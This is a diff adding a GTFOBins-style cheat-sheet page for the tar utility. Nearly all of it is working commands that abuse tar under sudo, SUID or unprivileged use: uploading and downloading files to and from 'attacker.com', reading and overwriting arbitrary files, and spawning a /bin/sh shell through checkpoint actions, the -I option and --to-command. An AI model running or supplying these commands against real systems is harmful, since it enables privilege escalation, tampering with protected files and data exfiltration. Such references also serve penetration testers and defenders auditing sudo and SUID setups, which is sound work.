@@ -1,0 +1,107 @@
+tar
+===
+
+Download
+--------
+
+[Sudo]
+    tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
+    The attacker box must have the `rmt` utility installed.
+
+[SUID]
+    tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
+    The attacker box must have the `rmt` utility installed.
+
+[Unprivileged]
+    tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
+    The attacker box must have the `rmt` utility installed.
+
+File read
+---------
+
+[Sudo]
+    tar cf /dev/stdout /path/to/input-file -I 'tar xO'
+    The file is read then passed to the specified command (e.g., `tar xO`) via standard input.
+
+[SUID]
+    tar cf /dev/stdout /path/to/input-file -I 'tar xO'
+    The file is read then passed to the specified command (e.g., `tar xO`) via standard input.
+
+[Unprivileged]
+    tar cf /dev/stdout /path/to/input-file -I 'tar xO'
+    The file is read then passed to the specified command (e.g., `tar xO`) via standard input.
+
+File write
+----------
+
+[Sudo]
+    echo DATA >/path/to/temp-file
+tar cf /path/to/temp-file.tar /path/to/temp-file
+tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
+    The archive can also be prepared offline then uploaded to the target.
+
+[SUID]
+    echo DATA >/path/to/temp-file
+tar cf /path/to/temp-file.tar /path/to/temp-file
+tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
+    The archive can also be prepared offline then uploaded to the target.
+
+[Unprivileged]
+    echo DATA >/path/to/temp-file
+tar cf /path/to/temp-file.tar /path/to/temp-file
+tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
+    The archive can also be prepared offline then uploaded to the target.
+
+Shell
+-----
+
+[Sudo]
+    tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+[SUID]
+    tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+[Unprivileged]
+    tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+[Sudo]
+    tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+
+[SUID]
+    tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+
+[Unprivileged]
+    tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+
+[Sudo]
+    echo '/bin/sh 0<&1' >/path/to/temp-file
+tar cf /path/to/temp-file.tar /path/to/temp-file
+tar xf /path/to/temp-file.tar --to-command /bin/sh
+    The archive can also be prepared offline then uploaded to the target.
+
+[SUID]
+    echo '/bin/sh 0<&1' >/path/to/temp-file
+tar cf /path/to/temp-file.tar /path/to/temp-file
+tar xf /path/to/temp-file.tar --to-command /bin/sh
+    The archive can also be prepared offline then uploaded to the target.
+
+[Unprivileged]
+    echo '/bin/sh 0<&1' >/path/to/temp-file
+tar cf /path/to/temp-file.tar /path/to/temp-file
+tar xf /path/to/temp-file.tar --to-command /bin/sh
+    The archive can also be prepared offline then uploaded to the target.
+
+Upload
+------
+
+[Sudo]
+    tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
+    The attacker box must have the `rmt` utility installed.
+
+[SUID]
+    tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
+    The attacker box must have the `rmt` utility installed.
+
+[Unprivileged]
+    tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
+    The attacker box must have the `rmt` utility installed.
